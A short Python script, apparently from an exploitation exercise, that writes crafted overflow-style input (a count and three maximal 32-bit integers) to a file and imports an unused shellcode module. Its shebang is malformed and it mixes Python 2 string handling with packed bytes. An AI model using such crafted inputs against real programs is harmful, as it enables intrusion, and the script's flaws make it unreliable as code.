#!/user/bin/bash/python

from struct import pack
from shellcode import shellcode

count = 3
ints = [4294967295, 4294967295, 4294967295]

out = ""
out += pack("<I", count)
for i in ints:
    out += pack("<I", i)

f = open("tmp", "wb")
f.write(out)
f.close()
